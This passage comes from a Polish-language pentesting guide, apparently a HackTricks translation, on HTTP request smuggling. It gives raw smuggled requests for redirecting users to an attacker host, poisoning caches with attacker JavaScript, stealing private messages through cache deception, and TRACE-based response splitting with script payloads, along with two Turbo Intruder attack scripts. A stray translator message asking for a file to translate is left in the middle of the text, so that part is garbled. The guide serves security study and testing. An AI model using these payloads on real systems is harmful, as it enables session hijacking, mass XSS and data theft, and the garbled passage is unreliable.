Host: normal-website.com
```
Skutkuje:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Choć pozornie nieszkodliwe, zachowanie to można zmanipulować za pomocą HTTP request smuggling, aby przekierować użytkowników na zewnętrzną stronę. Na przykład:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
To przemycone żądanie może spowodować, że następne przetworzone żądanie użytkownika zostanie przekierowane na stronę kontrolowaną przez atakującego:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Skutkuje:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
W tym scenariuszu żądanie użytkownika o plik JavaScript zostaje przechwycone. Atakujący może potencjalnie skompromitować użytkownika, serwując złośliwy JavaScript w odpowiedzi.

### Wykorzystanie Web Cache Poisoning przez HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning może zostać przeprowadzone, jeśli którykolwiek element **infrastruktury front-end buforuje zawartość**, zwykle w celu zwiększenia wydajności. Poprzez manipulację odpowiedzią serwera możliwe jest **zatrucie cache**.

Wcześniej obserwowaliśmy, jak odpowiedzi serwera mogą zostać zmienione, aby zwracać błąd 404 (odwołaj się do [Basic Examples](#basic-examples)). Podobnie, można oszukać serwer, aby dostarczył zawartość /index.html w odpowiedzi na żądanie /static/include.js. W konsekwencji zawartość /static/include.js zostaje zastąpiona w pamięci podręcznej zawartością /index.html, co sprawia, że /static/include.js staje się niedostępny dla użytkowników, potencjalnie prowadząc do Denial of Service (DoS).

Technika ta staje się szczególnie groźna, jeśli zostanie odkryta podatność typu Open Redirect lub jeśli istnieje on-site redirect prowadzący do open redirect. Takie podatności można wykorzystać, aby zastąpić zbuforowaną zawartość /static/include.js skryptem kontrolowanym przez atakującego, co de facto umożliwia szeroką skalę ataku Cross-Site Scripting (XSS) wobec wszystkich klientów żądających zaktualizowanego /static/include.js.

Poniżej znajduje się ilustracja wykorzystania cache poisoning w połączeniu z on-site redirect do open redirect. Celem jest zmiana zawartości cache dla /static/include.js tak, aby serwować kod JavaScript kontrolowany przez atakującego:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Zauważ osadzone żądanie skierowane do `/post/next?postId=3`. To żądanie zostanie przekierowane do `/post?postId=4`, wykorzystując **Host header value** do określenia domeny. Poprzez zmianę nagłówka **Host header**, atakujący może przekierować żądanie do swojej domeny (**on-site redirect to open redirect**).

Po udanym **socket poisoning**, należy zainicjować **GET request** do `/static/include.js`. To żądanie zostanie skażone przez wcześniejsze żądanie **on-site redirect to open redirect** i pobierze zawartość skryptu kontrolowanego przez atakującego.

W konsekwencji każde żądanie do `/static/include.js` będzie serwować z pamięci podręcznej zawartość skryptu kontrolowanego przez atakującego, co skutecznie uruchomi szeroki atak XSS.

### Using HTTP request smuggling to perform web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Jaka jest różnica między web cache poisoning a web cache deception?**
>
> - W **web cache poisoning** atakujący powoduje, że aplikacja zapisuje złośliwą zawartość w cache, a ta zawartość jest serwowana z cache innym użytkownikom aplikacji.
> - W **web cache deception** atakujący powoduje, że aplikacja zapisuje w cache wrażliwe treści należące do innego użytkownika, a następnie atakujący pobiera te treści z cache.

Atakujący tworzy smuggled request, które pobiera wrażliwe treści specyficzne dla użytkownika. Rozważ następujący przykład:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Jeśli ten smuggled request zatruje cache entry przeznaczony dla static content (np. `/someimage.png`), wrażliwe dane ofiary z `/private/messages` mogą zostać cached pod wpisem tego cache entry. W konsekwencji atakujący mógłby potencjalnie odzyskać te cached sensitive data.

### Abusing TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**W tym poście**](https://portswigger.net/research/trace-desync-attack) zasugerowano, że jeśli serwer ma włączoną metodę TRACE, można ją potencjalnie wykorzystać za pomocą HTTP Request Smuggling. Dzieje się tak, ponieważ ta metoda odzwierciedla dowolny nagłówek wysłany do serwera jako część ciała odpowiedzi. Na przykład:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Proszę wklej zawartość pliku src/pentesting-web/http-request-smuggling/README.md, którą chcesz przetłumaczyć na polski. Zwrócę przetłumaczony plik zachowując dokładnie wszystkie markdown/HTML, linki, ścieżki, tagi i fragmenty kodu bez zmian.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Przykładem nadużycia tego zachowania byłoby **smuggle first a HEAD request**. To żądanie zostanie obsłużone jedynie przy użyciu **nagłówków** odpowiedzi GET (**`Content-Type`** wśród nich). I **smuggle immediately after the HEAD a TRACE request**, które będzie **odzwierciedlać wysłane dane**.\
Ponieważ odpowiedź HEAD będzie zawierać nagłówek `Content-Length`, **odpowiedź na żądanie TRACE zostanie potraktowana jako ciało odpowiedzi HEAD, w związku z czym w odpowiedzi zostaną odzwierciedlone dowolne dane**.\
Ta odpowiedź zostanie wysłana do następnego żądania przez połączenie, więc można to **użyć w zbuforowanym pliku JS na przykład do wstrzyknięcia dowolnego kodu JS**.

### Nadużywanie TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Kontynuowanie lektury [**this post**](https://portswigger.net/research/trace-desync-attack) sugeruje inny sposób nadużycia metody TRACE. Jak wspomniano, smuggling a HEAD request and a TRACE request pozwala **kontrolować pewne odzwierciedlone dane** w odpowiedzi na żądanie HEAD. Długość ciała żądania HEAD jest zasadniczo wskazywana w nagłówku `Content-Length` i jest formowana przez odpowiedź na żądanie TRACE.

W związku z tym nowy pomysł polega na tym, że znając tę wartość `Content-Length` oraz dane zawarte w odpowiedzi TRACE, można sprawić, aby odpowiedź TRACE zawierała prawidłową odpowiedź HTTP po ostatnim bajcie określonym przez `Content-Length`, pozwalając atakującemu na pełną kontrolę nad żądaniem do następnej odpowiedzi (co mogłoby być użyte do przeprowadzenia cache poisoning).

Przykład:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Wygeneruje te odpowiedzi (zauważ, że odpowiedź HEAD ma nagłówek Content-Length, co sprawia, że odpowiedź TRACE staje się częścią body odpowiedzi HEAD, a gdy Content-Length odpowiedzi HEAD dobiegnie końca, zostaje smuggled prawidłowa odpowiedź HTTP):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Wykorzystanie HTTP Request Smuggling przy użyciu HTTP Response Desynchronisation

Znalazłeś podatność typu HTTP Request Smuggling i nie wiesz, jak ją wykorzystać? Wypróbuj następujące metody eksploatacji:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Inne techniki HTTP Request Smuggling

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Skrypty Turbo intruder

### CL.TE

Źródło: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Źródło: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Narzędzia

- HTTP Hacker (Burp BApp Store) – wizualizuje konkatenację/ramowanie oraz niskopoziomowe zachowanie HTTP
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): To narzędzie oparte na gramatyce do fuzzowania HTTP, przydatne do wykrywania nietypowych rozbieżności w request smuggling.

## Odnośniki

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Uwaga na fałszywe pozytywy: jak odróżnić HTTP pipelining od request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
